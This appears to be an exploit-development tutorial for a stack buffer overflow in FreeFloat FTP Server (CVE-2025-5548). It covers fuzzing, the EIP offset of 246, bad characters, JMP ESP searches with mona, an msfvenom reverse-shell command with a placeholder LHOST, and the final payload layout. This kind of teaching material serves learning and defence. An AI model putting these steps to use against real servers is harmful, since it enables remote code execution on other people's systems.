
# 🔎 Methodology for Exploiting CVE-2025-5548

This document describes a **structured methodology for exploiting CVE-2025-5548**, a vulnerability affecting **FreeFloat FTP Server** that leads to a **stack-based buffer overflow**.

The guide walks through each phase of exploit development, from understanding the target to achieving **code execution**.

---

# 📚 Table of Contents

* [Step 0: Understanding the Target](#step-0-understanding-the-target)
* [Step 1: Fuzzing the Command](#step-1-fuzzing-the-command)
* [Step 2: Discover Offset to EIP Register](#step-2-discover-offset-to-eip-register)
* [Step 3: Control EIP](#step-3-control-eip)
* [Step 4: Find Bad Characters](#step-4-find-bad-characters)
* [Step 5: JMP ESP](#step-5-jmp-esp)
* [Step 6: Generate Shellcode](#step-6-generate-shellcode)
* [Step 7: Exploit Vulnerability (RCE / PrivEsc)](#step-7-exploit-vulnerability)

---

# 🧭 Step 0: Understanding the Target

Before beginning exploitation, it is important to understand **how the server processes input** and where the vulnerability occurs.

**FreeFloat FTP Server** is a legacy FTP service that listens on **TCP port 21** and processes commands through an internal **command dispatcher**. Because the software was written without modern security protections, several handlers rely on unsafe functions such as `strcpy`, which can lead to **stack buffer overflows**.


## 💻 Notes

```
IDA -> New -> Open FTPServer.exe -> OK
View -> Open subviews -> Strings
Search -> "USER "
Double click -> USER
Right click -> Xrefs graph to ...
Follow -> sub_xxxxxx -> Command handler
Follow function calls -> Look for strcpy
```

---
<br>
We begin by analyzing where the vulnerable function and the execution of FTP server. For that:
<br>

Start IDA and analize the strings:

<img width="333" height="382" alt="image" src="https://github.com/user-attachments/assets/7a13b891-8354-4b7e-9687-7e77ef510767" /> <br>

<img width="643" height="511" alt="image" src="https://github.com/user-attachments/assets/fb822e46-8ed1-4296-a382-92504c8418f9" /> <br>

<img width="643" height="321" alt="image" src="https://github.com/user-attachments/assets/9b8f1ad6-b5db-4baf-a27b-e74aad50f1a7" /><br>

<img width="643" height="105" alt="image" src="https://github.com/user-attachments/assets/0729f2e6-28e8-4039-b92f-37497fe9e377" /><br>

<img width="643" height="319" alt="image" src="https://github.com/user-attachments/assets/f20ac6d0-3ed2-408d-a4a0-a74a10cc9f1d" /><br>

<img width="643" height="303" alt="image" src="https://github.com/user-attachments/assets/f7d384b0-2dce-498d-8aaa-b83d2da8bf8e" /><br>

 Let's look for the vulnerable function, for that we are going to view/ open subviews and choose the strings option: <br>
 
 <img width="643" height="390" alt="image" src="https://github.com/user-attachments/assets/01067810-c630-43df-b187-65fc737f498d" /><br>
 
 <img width="643" height="574" alt="image" src="https://github.com/user-attachments/assets/ecab1f1c-19a3-4be2-ae97-f78f5e98255c" /><br>
 
<img width="643" height="309" alt="image" src="https://github.com/user-attachments/assets/f57d123a-d024-498d-b663-71dc51609b91" /><br>

<img width="408" height="366" alt="image" src="https://github.com/user-attachments/assets/a3a6bcb6-39ff-44d9-9458-3ef582533404" /><br>
 
```
```
---

# 🧭 Step 1: Fuzzing the Command

Once the target is understood, the next step is to determine how the server reacts to **oversized input**.

This process is called **fuzzing**. The idea is to send progressively larger strings until the program **crashes or stops responding**.

If the server crashes while processing long input, it likely indicates a **buffer overflow vulnerability**.

## 💻 Notes

* Create a **Python socket script**
* Connect to **port 21**
* Authenticate with `USER` / `PASS`
* Send the `NOOP` command with a large payload
* Gradually increase the payload size
  

<img width="373" height="365" alt="image" src="https://github.com/user-attachments/assets/c8cb42ad-c8dd-42c1-929d-23a627c1e484" /><br>

<img width="1336" height="141" alt="image" src="https://github.com/user-attachments/assets/d3890640-bd0e-4412-a0df-7248e11076ee" /><br>

<img width="643" height="335" alt="image" src="https://github.com/user-attachments/assets/122ae761-5584-466c-a312-44dca7715373" /><br>

```
```

# 🧭 Step 2: Discover Offset to EIP Register

After confirming the crash, we need to determine how many bytes are required to overwrite the **EIP register**.

The **EIP (Instruction Pointer)** controls the program execution flow. If we overwrite it, we can redirect execution to our own payload.

Instead of sending `"AAAA..."`, we send a **cyclic pattern**. When the crash occurs, the value found in EIP reveals the exact **offset** where the overwrite happens.

<img width="643" height="163" alt="image" src="https://github.com/user-attachments/assets/eb5c43a3-cc82-49b0-bb7d-17cd0a0ad8f3" /><br>

<img width="643" height="306" alt="image" src="https://github.com/user-attachments/assets/3d1544b5-bf77-4d16-98b5-92348d51e641" /><br>


## 💻 Notes

Generate cyclic pattern:

We create a folder in C: called Mona and assign it in Immunity:

<img width="643" height="301" alt="image" src="https://github.com/user-attachments/assets/b47847fe-7ca9-4000-8832-ab8149c57df8" /><br>

<img width="643" height="355" alt="image" src="https://github.com/user-attachments/assets/dff7baee-37b5-4330-b16d-2b9cd76ea51a" /><br>
```
```
(Windows)
Generate larger pattern:

```
!mona pattern_create 400
```
<img width="643" height="207" alt="image" src="https://github.com/user-attachments/assets/fc92a2f2-0a7d-4476-b908-93cffd101f17" /><br>

<img width="643" height="60" alt="image" src="https://github.com/user-attachments/assets/cb0bfa5f-4f12-4266-8468-dca6a1d64796" /><br>


Calculate offset:

<img width="583" height="175" alt="image" src="https://github.com/user-attachments/assets/b61c7a2c-6c4c-491f-aeaf-d2aecc9914d2" /><br>

<img width="592" height="201" alt="image" src="https://github.com/user-attachments/assets/e8a41612-2acc-4730-98f7-64e014cde607" /><br>

```
!mona pattern_offset 41326941
```
<img width="643" height="130" alt="image" src="https://github.com/user-attachments/assets/6f3d4087-bdda-4e54-b9ef-726102fa1455" /><br>

```
[*] Exact match at offset 246

```
---

# 🧭 Step 3: Control EIP

After identifying the offset, we must verify that we can **overwrite the EIP register**.

To do this, we send a payload composed of:

* Padding until the offset
* A controlled value replacing EIP
* Optional data after EIP

If successful, the debugger will show the injected value inside **EIP**.

## 💻 Notes

Example payload:

```
"A" * 246 + "BBBB"
```
```
```
<img width="565" height="252" alt="image" src="https://github.com/user-attachments/assets/ef4c6f1b-a818-4937-bd44-0bbfcb7e6405" /><br>

If the exploit works, **EIP will contain 0x42424242**.

<img width="643" height="285" alt="image" src="https://github.com/user-attachments/assets/7c0d1f49-5cc4-4eff-bd5d-89a8ed39d805" /><br>

With this register we see what the next instruction that the CPU has to execute before making a return points to

```
```

# 🧭 Step 4: Find Bad Characters

After controlling EIP, we must identify **bad characters**.

Some bytes cannot be used in payloads because they:

* Terminate strings
* Break command parsing
* Are modified during processing

These characters must be removed from the final shellcode.

## 💻 Notes

Common bad characters:

We check manually when running the script, we see that after the BBBB, instead of starting the sequence at 01, it starts with 27, where we see a bad character.

<img width="503" height="288" alt="image" src="https://github.com/user-attachments/assets/db1b1390-c4ac-4b7d-bbc8-5347f68f9442" /><br>

<img width="643" height="266" alt="image" src="https://github.com/user-attachments/assets/c372eda9-f7d7-487d-82d4-792045a57dad" /><br>

```
\x00  (Null byte)
\x0A  (New line)
\x0D  (Carriage return)
\xFF
```

This would be an example of a manual search. But to avoid doing this manually by removing the bad characters from the code, we will use Mona again, which will do it for us automatically without having to go one by one manually. For this:

We run the command mona bytearray and it will create the file with all possible bad characters in the path previously created for Mona, which would be what we need to start identifying them. But we already have it in the script.

Generate byte array:

Using Mona:

```
mkdir C:\Mona
!mona config -set workingfolder C:\Mona
!mona bytearray
```
<img width="643" height="154" alt="image" src="https://github.com/user-attachments/assets/2866a2db-9278-4ace-9187-71d0f0f6910a" /><br>

<img width="643" height="164" alt="image" src="https://github.com/user-attachments/assets/b8bdce5a-3742-4c91-8b6a-f7913ebb3197" /><br>

Compare memory:

```
!mona compare -f C:\Mona\bytearray.bin -a ESP_ADDRESS
```
<img width="643" height="382" alt="image" src="https://github.com/user-attachments/assets/37def3bb-9690-4704-a046-a12101fed120" /><br>

<img width="643" height="336" alt="image" src="https://github.com/user-attachments/assets/509c6a03-1d39-4a84-835d-4f461699d3e9" /><br>

Remove bad characters iteratively:

We would perform the same process as many times as necessary until, when running the script, no errors appear in Immunity with the possible bad characters. For this, you need to specify in the ¡mona bytearray command the bad character that we removed earlier, so that it generates the bad characters again without the one we previously found:
```
!mona bytearray -b "\x00"
!mona bytearray -b "\x00\x0a"
!mona bytearray -b "\x00\x0a\x0d"
---
```
<img width="643" height="140" alt="image" src="https://github.com/user-attachments/assets/b0bbe75a-cd8a-4c2e-b5a9-ace8e067fb06" /><br>
```
With all the ones we find, we have to add them in the bytearray separate from . In this case they were the x00x0ax0d
```
---
<img width="643" height="488" alt="image" src="https://github.com/user-attachments/assets/2e261899-13d8-443d-8795-0713066ba344" /><br>

---

# 🧭 Step 5: JMP ESP

Once we control EIP and know which characters are safe, the next step is to redirect execution to our **shellcode**.

Since the shellcode will be located on the **stack**, we overwrite EIP with the address of an instruction such as:

```
JMP ESP
```

This instruction redirects execution to the memory address stored in **ESP**, where our payload resides.

On **legacy systems (Windows XP / Windows 7)**, many modules have fixed addresses, making this step straightforward.

On **modern systems (Windows 10 / Windows 11)**, most modules use:

* **ASLR**
* **DEP**
* **SafeSEH**

This makes finding reliable gadgets more difficult.

For educational purposes, exploitation can still be demonstrated while running the program **inside a debugger**, where addresses remain stable during the session.

## 💻 Notes

Find modules:

```
!mona modules
```
<img width="643" height="308" alt="image" src="https://github.com/user-attachments/assets/67590c1d-0412-41b9-9a03-798dde638dcb" /><br>

Search JMP ESP:

```
!mona jmp -r esp -cpb "\x00\x0a\x0d"
```
<img width="643" height="383" alt="image" src="https://github.com/user-attachments/assets/69c3218d-5e06-4247-b4b5-9af078d5361b" /><br>

Search instruction manually:

```
!mona asm -s "jmp esp"
```
<img width="643" height="346" alt="image" src="https://github.com/user-attachments/assets/83172a52-04ef-4464-a6ad-98903660c16e" /><br>

Find opcode:

We already know that this program execution has an ESP jump, so we save it so we don't have to look for it again
```
!mona find -s "\xff\xe4" -cpb "\x00\x0a\x0d"
```
<img width="643" height="305" alt="image" src="https://github.com/user-attachments/assets/79fc725a-7389-476c-81c9-445ed4e0dc81" /><br>

CALL ESP:

```
!mona find -s "\xff\xd4" -cpb "\x00\x0a\x0d"
```
<img width="643" height="305" alt="image" src="https://github.com/user-attachments/assets/9043c6d1-3752-4f4c-9b95-143461609c1f" /><br>

JMP [ESP]:

```
!mona find -s "\xff\x24\x24" -cpb "\x00\x0a\x0d"
```
<img width="643" height="75" alt="image" src="https://github.com/user-attachments/assets/d7b70ba7-0cc5-4d0b-89e1-e18c3e6815fd" /><br>

Search ROP gadgets:

```
!mona rop -cpb "\x00\x0a\x0d"
```
<img width="643" height="269" alt="image" src="https://github.com/user-attachments/assets/0aa3e17a-fa86-4e18-8c49-e3735eb7a7ba" /><br>

```
```
<img width="643" height="225" alt="image" src="https://github.com/user-attachments/assets/b00ff090-3efb-4f2b-bc32-9c040e1d56e7" /><br>

---

# 🧭 Step 6: Generate Shellcode

Once execution flow is redirected, we generate **shellcode** that performs the desired action.

Common payloads include:

* Reverse shell
* Bind shell
* Command execution

Example using **msfvenom**:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d" -f python
```

The bad characters discovered earlier must be excluded using the `-b` parameter.

---
---

# 🧭 Step 7: Exploit Vulnerability (RCE / PrivEsc)

Finally, we build the full exploit payload:

```
[ padding ] + [ EIP overwrite ] + [ NOP sled ] + [ shellcode ]
```

Example structure:

```
"A"*246 + JMP_ESP + "\x90"*32 + shellcode
```

Once sent to the server, execution flow jumps to **ESP**, runs the shellcode, and provides **remote code execution (RCE)**.

Depending on the service privileges, this may also lead to **privilege escalation**.

---

# 🏁 Conclusion

This methodology demonstrates a **classic stack-based buffer overflow exploitation workflow**, including:

* Reverse engineering the binary
* Fuzzing the vulnerable command
* Calculating the EIP offset
* Controlling execution flow
* Identifying bad characters
* Redirecting execution to shellcode

Although modern systems include strong protections such as **ASLR and DEP**, understanding this methodology remains fundamental for learning **exploit development and binary exploitation**.

---

⭐ If this guide was helpful, consider **starring the repository**.
